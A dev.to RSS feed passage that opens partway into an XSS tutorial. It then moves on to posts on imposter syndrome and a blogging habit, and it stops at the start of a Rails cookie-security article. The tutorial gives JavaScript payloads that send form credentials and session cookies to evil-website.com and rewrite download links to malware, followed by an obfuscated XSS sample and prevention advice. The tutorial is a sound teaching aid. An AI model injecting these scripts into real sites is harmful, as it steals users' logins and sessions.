&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;form_element&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;getElementsByTagName&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;form&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
&lt;span class="nx"&gt;form_element&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;addEventListener&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;submit&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;

  &lt;span class="c1"&gt;// capture the username and password from the form&lt;/span&gt;
  &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;username&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;getElementById&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;username_input&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;value&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;getElementById&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;password_input&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;value&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

  &lt;span class="c1"&gt;// send the username and password to the attacker&lt;/span&gt;
  &lt;span class="nx"&gt;fetch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;`https://evil-website.com/password-capture/?u=&lt;/span&gt;&lt;span class="p"&gt;${&lt;/span&gt;&lt;span class="nx"&gt;username&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;amp;p=&lt;/span&gt;&lt;span class="p"&gt;${&lt;/span&gt;&lt;span class="nx"&gt;password&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;`&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;},&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#scenario-2-hijacking-sessions-from-a-forum" class="anchor"&gt;
  &lt;/a&gt;
  Scenario 2: Hijacking sessions from a forum
&lt;/h3&gt;

&lt;p&gt;Suppose that our attacker has discovered a stored XSS vulnerability in a forum page. For the sake of this example, the forum is storing session without the &lt;code&gt;HttpOnly&lt;/code&gt; attribute (more on that &lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#restrict_access_to_cookies"&gt;here&lt;/a&gt;). &lt;/p&gt;

&lt;p&gt;The attacker could inject a script to grab the session cookie of anyone that is logged in to the forum that views the thread, and could impersonate their user on the forum or the site at large:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="c1"&gt;// capture the cookies&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;cookie&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;cookie&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="c1"&gt;// send the cookies to the attacker&lt;/span&gt;
&lt;span class="nx"&gt;fetch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;`https://evil-website.com/cookie-capture`&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="na"&gt;data&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;cookie&lt;/span&gt;
&lt;span class="p"&gt;});&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#scenario-3-compromising-a-downloads-page-to-install-malware" class="anchor"&gt;
  &lt;/a&gt;
  Scenario 3: Compromising a downloads page to install malware
&lt;/h3&gt;

&lt;p&gt;Suppose that the attacker has compromised the download page of a website with a cross-site scripting attack. They could use a XSS payload to modify the download links, so that instead of attempting to download the intended software, they point to malicious software hosted on the attacker's server. When users load the page and attempt to download the intended softare, they are served malware from the attacker's server:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="c1"&gt;// grab all download links on the page&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;download_links&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;getElementsByClassName&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;download-link&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="c1"&gt;// change their target to a malicious piece of software hosted on the attacker's server&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;link&lt;/span&gt; &lt;span class="k"&gt;of&lt;/span&gt; &lt;span class="nx"&gt;download_links&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="nx"&gt;link&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setAttribute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;href&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;https://evil-website.com/evil-program.exe&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#still-not-convinced" class="anchor"&gt;
  &lt;/a&gt;
  Still not convinced?
&lt;/h3&gt;

&lt;p&gt;The possible applications of XSS attacks are numerous - aside from stealing credentials, hijacking sessions, and modifying links, XSS can be used to modify the page at will, it can be used to impersonate the victim user, and it can be used to perform any action that the victim is allowed to do on the site.&lt;/p&gt;

&lt;p&gt;Famously, or perhaps infamously, cross-site scripting vulnerabilities were exploited in a type of attack known as &lt;a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/magecart-an-overview-and-defense-mechanisms/"&gt;magecart attacks&lt;/a&gt; to steal users' credit card information from online payment forms.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#preventing-xss-attacks" class="anchor"&gt;
  &lt;/a&gt;
  Preventing XSS Attacks
&lt;/h2&gt;

&lt;p&gt;XSS vulnerabilities are incredibly easy to create by accident. To prevent them, you need to put in place good coding practices, code review processes, and multiple layers of defense. The easiest way to prevent XSS would be to never allow users to supply data that's rendered into the page, but the fact is that this isn't a practical answer, since most applications store and manipulate user input in some form. Unfortunately, there is no one single foolproof way to prevent XSS. Therefore, it is important to have multiple layers of defense against cross-site scripting. &lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#validate-and-sanitize-usersupplied-data" class="anchor"&gt;
  &lt;/a&gt;
  Validate and Sanitize User-supplied Data
&lt;/h3&gt;

&lt;p&gt;User data should be validated on the front end of sites for correctness (e.g. email and phone number formatting), but it should also always be validated and sanitized on the backend for security. Depending on the application, you may be able to whitelist alphanumeric characters, and blacklist all other characters. However, this solution is not foolproof. It may help mitigate attacks, but it cannot prevent them entirely.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#html-encoding" class="anchor"&gt;
  &lt;/a&gt;
  HTML Encoding
&lt;/h3&gt;

&lt;p&gt;Any time that you are rendering user-provided data into the body of the document (e.g. with the &lt;code&gt;innerHTML&lt;/code&gt; attribute in JavaScript), you should HTML encode the data. However, this &lt;strong&gt;may not always&lt;/strong&gt; prevent XSS if you are placing user-provided data in HTML tag attributes, and &lt;strong&gt;is not effective&lt;/strong&gt; against placing untrusted data inside of a &lt;code&gt;&amp;lt;script&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt; tag. If you decide to place user-provided data in HTML tag attributes, ensure that you are always using quotes around your attributes.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#use-a-security-encoding-library" class="anchor"&gt;
  &lt;/a&gt;
  Use A Security Encoding Library
&lt;/h3&gt;

&lt;p&gt;For many languages and frameworks, there are security encoding libraries that can help prevent XSS. For example, OWASP has &lt;a href="https://owasp.org/www-project-java-encoder/"&gt;one such library&lt;/a&gt; for Java. You should consider using a similar library for your web projects.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#use-a-web-application-firewall" class="anchor"&gt;
  &lt;/a&gt;
  Use a Web Application Firewall
&lt;/h3&gt;

&lt;p&gt;It may seem like overkill, but there are web application firewalls designed to specifically prevent common web attacks such as XSS and SQL Injection. Using a web application firewall (WAF) is not necessary for most applications, but for applications that require strong security, they can be a great resource. One such WAF is &lt;a href="https://github.com/SpiderLabs/ModSecurity"&gt;ModSecurity&lt;/a&gt;, which is available for Apache, Nginx, and IIS. Check out their &lt;a href="https://github.com/SpiderLabs/ModSecurity/wiki"&gt;wiki&lt;/a&gt; for more information.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#other-resources" class="anchor"&gt;
  &lt;/a&gt;
  Other resources
&lt;/h3&gt;

&lt;p&gt;OWASP and PortSwigger both have &lt;em&gt;excellent&lt;/em&gt; guides on preventing cross-site scripting attacks:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="https://portswigger.net/web-security/cross-site-scripting/preventing"&gt;https://portswigger.net/web-security/cross-site-scripting/preventing&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"&gt;https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3&gt;
  &lt;a href="#how-not-to-prevent-xss-attacks" class="anchor"&gt;
  &lt;/a&gt;
  How &lt;strong&gt;not&lt;/strong&gt; to prevent XSS attacks
&lt;/h3&gt;

&lt;p&gt;There are lots of great ways to mitigate and prevent XSS attacks, but there are also lots of &lt;em&gt;really bad&lt;/em&gt; ways to try and prevent it. Here are some common ways that people try to prevent XSS that are unlikely to be successful:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;searching for &lt;code&gt;&amp;lt;&lt;/code&gt; and &lt;code&gt;&amp;gt;&lt;/code&gt; characters in user-supplied data&lt;/li&gt;
&lt;li&gt;searching for &lt;code&gt;&amp;lt;script&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt; tags in user-supplied data&lt;/li&gt;
&lt;li&gt;using regexes to try and filter out script tags or other common XSS injections&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;In reality, XSS payloads can be extremely complicated, and can also be extremely obfuscated. Here's an example:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight html"&gt;&lt;code&gt;&lt;span class="nt"&gt;&amp;lt;BODY&lt;/span&gt; &lt;span class="na"&gt;onload&lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt;&lt;span class="na"&gt;#&lt;/span&gt;&lt;span class="err"&gt;$%&amp;amp;()&lt;/span&gt;&lt;span class="na"&gt;*&lt;/span&gt;&lt;span class="err"&gt;~+&lt;/span&gt;&lt;span class="na"&gt;-_.&lt;/span&gt;&lt;span class="err"&gt;,&lt;/span&gt;&lt;span class="na"&gt;:&lt;/span&gt;&lt;span class="err"&gt;;?@[/|\]^`=&lt;/span&gt;&lt;span class="na"&gt;alert&lt;/span&gt;&lt;span class="err"&gt;("&lt;/span&gt;&lt;span class="na"&gt;XSS&lt;/span&gt;&lt;span class="err"&gt;")&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;Cybercriminals often have extremely robust tools that can be used to attempt to bypass filters by obfuscating their XSS payloads. A homebrew regex is probably not going to cut it.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#conclusion" class="anchor"&gt;
  &lt;/a&gt;
  Conclusion
&lt;/h3&gt;

&lt;p&gt;Key takeaways:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;There are 3 types of XSS: Reflected, DOM-based, and stored&lt;/li&gt;
&lt;li&gt;XSS can be exploited to execute arbitrary JavaScript in a users's web browser&lt;/li&gt;
&lt;li&gt;XSS attacks can be used to steal authentication information, hijack sessions, steal sensitive data, and deface websites.&lt;/li&gt;
&lt;li&gt;Prevent XSS by sanitizing user data on the backend, HTML-encode user-provided data that's rendered into the template, and use a security encoding library or WAF.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I hope you find this useful! Let me know what you think in the comments below. &lt;/p&gt;

&lt;p&gt;If you're writing code for cloud applications, you need to know when things go wrong. I helped build &lt;a href="https://codelighthouse.io/?ref=DEV"&gt;CodeLighthouse&lt;/a&gt; to send real-time application error notifications straight to developers so that you can find and fix errors faster. Get started for free at &lt;a href="https://codelighthouse.io/?ref=DEV"&gt;codelighthouse.io&lt;/a&gt; today!&lt;/p&gt;

</description>
      <category>javascript</category>
      <category>cybersecurity</category>
      <category>webdev</category>
    </item>
    <item>
      <title>Getting over Imposter Syndrome</title>
      <author>Linda</author>
      <pubDate>Mon, 18 Jan 2021 16:16:00 +0000</pubDate>
      <link>https://dev.to/lindaojo/getting-over-imposter-syndrome-39ia</link>
      <guid>https://dev.to/lindaojo/getting-over-imposter-syndrome-39ia</guid>
      <description>&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--KPPtBcQE--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/ntmgq7kdpsxx7qqp42v8.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--KPPtBcQE--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/ntmgq7kdpsxx7qqp42v8.jpg" alt="Among Us Imposter"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This article was originally posted at &lt;a href="https://www.lindaojo.com/blog/getting-over-imposter-syndrome/"&gt;lindaojo.com&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;In this short article, I will expose the fraud that is your imposter syndrome by asking you a few questions. Let's dive in!&lt;/p&gt;

&lt;p&gt;Firstly you should know that imposter syndrome is a product of your mind. Being more successful will not make it go away. &lt;/p&gt;

&lt;h3&gt;Who is an imposter&lt;/h3&gt;

&lt;p&gt;An imposter is a person who pretends to be somebody else, often through means of disguise. It is safe to assume that in the case of a developer,  it's someone who claims to have skills and experiences that they don't possess. Is that what you are doing? I hope not.&lt;/p&gt;

&lt;h3&gt;What exactly are you "pretending" to be?&lt;/h3&gt;

&lt;p&gt;If you think you are an imposter, that means you believe you are pretending to be something you are not. My question to you is what exactly are you "pretending" to be?&lt;/p&gt;

&lt;p&gt;For instance, are you pretending to be a junior, mid or senior developer?&lt;/p&gt;

&lt;h3&gt;What are your expectations?&lt;/h3&gt;

&lt;p&gt;Now you know what you are pretending to be. Ask yourself if you meet the requirements to be such a person.&lt;/p&gt;

&lt;p&gt;Example, if you think you are a junior developer pretending to be a senior developer, then ask yourself:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;What skills of a senior developer am I lacking?&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;What kind of skills should a senior developer have?&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Once you have answered the questions above, You need to check if your answers are accurate and realistic.&lt;/p&gt;

&lt;h3&gt;Are your expectations realistic?&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;What are real world expectations of your current job title? &lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Do you think the expectations you set for yourself are realistic? If yes then work towards meeting those expectations to boost your confidence.&lt;/p&gt;

&lt;p&gt;If you think the expectations are unrealistic, then, you are expecting too much of yourself and can ease up a bit.&lt;/p&gt;

&lt;p&gt;Setting unrealistic expectations is very common amongst new developers. For instance, expecting yourself to remember the syntax for every programming language is impractical. It's alright to google even the simplest syntax.&lt;/p&gt;

&lt;h3&gt;Are you "deceiving" a lot of people?&lt;/h3&gt;

&lt;p&gt;If you think you are an imposter but some how no one has been able to find out cause you complete your tasks and build great products then you should remind yourself more often of your achievements and give yourself a bit of credit.&lt;/p&gt;

&lt;h3&gt;Appreciate your work&lt;/h3&gt;

&lt;p&gt;Internalize the kindness you show to others.&lt;br&gt;
It is very easy to downplay our wins and exaggerate the wins of those around us, because we witness our trials and errors, not theirs.&lt;/p&gt;

&lt;p&gt;I hope answering some of the question above helps you realise you are probably not an imposter.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://lindaojo.com/articles"&gt;Read more of my articles&lt;/a&gt;&lt;/p&gt;

</description>
      <category>beginners</category>
      <category>career</category>
      <category>productivity</category>
      <category>impostersyndrome</category>
    </item>
    <item>
      <title>My Three Strikes Rule for Blogging</title>
      <author>swyx</author>
      <pubDate>Mon, 18 Jan 2021 15:34:46 +0000</pubDate>
      <link>https://dev.to/swyx/my-three-strikes-rule-for-blogging-4b5i</link>
      <guid>https://dev.to/swyx/my-three-strikes-rule-for-blogging-4b5i</guid>
      <description>&lt;p&gt;Here's how to stop being so darn precious about your blogging: &lt;strong&gt;The third time you use an idea in a conversation, you have to blog about it.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--6pf0Ndn1--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/dgn7cqkm5385vom48amy.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--6pf0Ndn1--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/dgn7cqkm5385vom48amy.png" alt="Visualized three strikes rule"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#why" class="anchor"&gt;
  &lt;/a&gt;
  Why
&lt;/h2&gt;

&lt;p&gt;People often wonder what to blog about. You can get really fancy with Google keyword research and content calendars and the like. It's too complicated for me, and often leads to the kind of impersonal, SEO-driven blogposts that are slowly ruining the web.&lt;/p&gt;

&lt;p&gt;We need a simple, authentic heuristic to decide. Let's think about the upper and lower bounds:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;It's possible to blog too much — nobody wants you to broadcast every waking thought. &lt;/li&gt;
&lt;li&gt;But it's more likely that we are just &lt;em&gt;not blogging enough&lt;/em&gt;. &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;What's obvious to you is often not obvious to others. How often do you speak with someone and casually mention something that is new to them?&lt;/p&gt;

&lt;p&gt;Pretty often.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--1nSKUXQt--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://imgs.xkcd.com/comics/ten_thousand.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--1nSKUXQt--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://imgs.xkcd.com/comics/ten_thousand.png" alt="xkcd 1053"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;It's natural to want to hold off publishing our insights and discoveries until the magical right time when it all clicks together in one beautiful, perfect essay that springs forth fully formed from our foreheads, making us famous and showing the world how smart we are.&lt;/p&gt;

&lt;p&gt;We want it so much we end up &lt;strong&gt;never writing it&lt;/strong&gt;. &lt;/p&gt;

&lt;p&gt;This is how the world misses out on so much of our unique voices, taste, and perspectives.&lt;/p&gt;

&lt;p&gt;The Three Strikes Rule is designed as both a filter (for passing thoughts) and a prompt (for you to write more). &lt;/p&gt;

&lt;p&gt;&lt;strong&gt;To stop being so precious&lt;/strong&gt; about your blog.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;To share ideas&lt;/strong&gt; more openly and freely with your readers.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;To &lt;a href="https://www.swyx.io/create_luck/"&gt;Create Luck&lt;/a&gt;&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;To create one reference&lt;/strong&gt; for that bunch of links you always end up searching for when you write or answer questions.&lt;/p&gt;

&lt;p&gt;And, quite honestly, &lt;strong&gt;to write shorter blogposts&lt;/strong&gt;. Nobody has time to read the 3,000 word preamble to your magnum opus. It's a blog, not a physical book — you can return over time to expand it if it's worth it (like &lt;a href="https://www.swyx.io/LIP"&gt;this&lt;/a&gt; or &lt;a href="https://www.swyx.io/how-to-name-things/"&gt;this&lt;/a&gt;). &lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Sidenote: Some people call these "blogs that grow over time" a &lt;a href="https://joelhooks.com/digital-garden"&gt;digital garden&lt;/a&gt;. The mental masturbation crowd prefer &lt;a href="https://writingcooperative.com/zettelkasten-how-one-german-scholar-was-so-freakishly-productive-997e4e0ca125"&gt;Zettelkasten&lt;/a&gt; because it sounds foreign. It doesn't matter what you call it, it matters that you do it and grow it.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2&gt;
  &lt;a href="#how" class="anchor"&gt;
  &lt;/a&gt;
  How
&lt;/h2&gt;

&lt;p&gt;Let's say we accept that "the 3rd time we reference an idea in a conversation, we have to blog about it". What does that really mean?&lt;/p&gt;

&lt;p&gt;I take an expansive view of what "ideas" and "conversations" means.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;strong&gt;Ideas&lt;/strong&gt; includes great talks, good books, useful concepts, obscure names, handy definitions, copied-and-pasted code snippets, historical facts, surprising charts, and even blogposts by other people. (Yes, you can blog about other blogs. &lt;a href="https://css-tricks.com/the-power-of-lampshading/"&gt;Like this&lt;/a&gt;. Why not?) Sometimes the idea will be your own, most times it will be your takes on others'. &lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Conversations&lt;/strong&gt; include in-person, on Zoom, on Twitter, wherever you communicate and exchange ideas.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;The first time&lt;/strong&gt; you refer to an idea, you probably just learned about it. It might be a fad; you may never find the idea useful again. Let it go.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;The second time&lt;/strong&gt; you refer to the idea, you should be taking note. Ideas are things we find useful in our day-to-day conversations, and there's probably a good amount of our readers who would too. But it might &lt;em&gt;still&lt;/em&gt; fade away, so we hold off on it. It still needs to &lt;strong&gt;prove its usefulness&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;By &lt;strong&gt;the third time&lt;/strong&gt; you refer to an idea, it's no longer a coincidence. It's a pattern. You're increasingly likely to refer to it again in future. It's marinated in your head for a bit, and you've likely gained some experience explaining it to others. It's also not so old that it may have lost relevance. It's time to write it down &lt;a href="https://www.hanselman.com/blog/do-they-deserve-the-gift-of-your-keystrokes"&gt;to save keystrokes&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Do I &lt;em&gt;literally&lt;/em&gt; write everything down after the 3rd time? No, sometimes the "three strikes" becomes the "five strikes" or the "ten strikes" rule, mostly out of laziness. But I know I &lt;em&gt;should&lt;/em&gt;. With this rule, I find that I blog more and people still get value out of the core idea.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;In case you were wondering... yes the "reference counter" on the Three Strikes rule itself got up to about 8 or 9 before I wrote this post. 🙈&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2&gt;
  &lt;a href="#delivery" class="anchor"&gt;
  &lt;/a&gt;
  Delivery
&lt;/h2&gt;

&lt;p&gt;Following this rule will dramatically increase the volume of your output. There's then the question of how to deliver these high frequency things. There are a few methods:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Tweet it out&lt;/li&gt;
&lt;li&gt;Dump them in a github repo (&lt;a href="https://github.com/jbranchaud/til"&gt;like this&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;Split your blog from "only having essays" mode to having both "essays" and "notes". Publish separate RSS feeds for them.&lt;/li&gt;
&lt;li&gt;Buffer them up for a "grab bag post" like &lt;a href="https://marginalrevolution.com/marginalrevolution/2021/01/what-ive-been-reading-183.html"&gt;Tyler Cowen&lt;/a&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Personally, I am exploring doing this with a &lt;a href="http://swyx.transistor.fm/"&gt;daily podcast&lt;/a&gt;. See what works for you.&lt;/p&gt;

&lt;p&gt;If you're worried that people will think you're too noisy, you probably shouldn't. &lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;"You’ll worry less about what people think about you when you realize how seldom they do." - David Foster Wallace, &lt;em&gt;Infinite Jest&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;I'd love for you to share great ideas more freely.&lt;/strong&gt; Great ideas deserve to be shared, and your readers will appreciate it.&lt;/p&gt;

</description>
      <category>writing</category>
    </item>
    <item>
      <title>Demystifying cookie security in Rails 6</title>
      <author>Ayush Newatia</author>
      <pubDate>Mon, 18 Jan 2021 15:18:44 +0000</pubDate>
      <link>https://dev.to/ayushn21/demystifying-cookie-security-in-rails-6-1j2f</link>
      <guid>https://dev.to/ayushn21/demystifying-cookie-security-in-rails-6-1j2f</guid>
      <description>&lt;p&gt;&lt;em&gt;This blog post was originally published on &lt;a href="https://binarysolo.chapter24.blog/demystifying-cookies-in-rails-6/"&gt;my blog&lt;/a&gt;.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;I've also given a talk based on this post. &lt;a href="https://www.youtube.com/watch?v=To_nVr7cwCg"&gt;Check it out here&lt;/a&gt;!&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://en.wikipedia.org/wiki/HTTP_cookie"&gt;Cookies&lt;/a&gt; are used in pretty much every modern web application. They're used for various purposes such as facilitating user authentication and storing user preferences. Since they're so widely used it's no surprise that a full-stack development framework like Rails has a &lt;a href="https://api.rubyonrails.org/classes/ActionDispatch/Cookies.html"&gt;simple and convenient API&lt;/a&gt; to manage them.  &lt;/p&gt;

&lt;p&gt;In this post I'll describe the different types of cookies supported by Ruby on Rails and how they work under the hood.  &lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#types-of-cookies-in-rails" class="anchor"&gt;
  &lt;/a&gt;
  Types of Cookies in Rails
&lt;/h1&gt;

&lt;p&gt;Rails supports the storage of 3 kinds of cookies:&lt;/p&gt;

&lt;ul&gt;
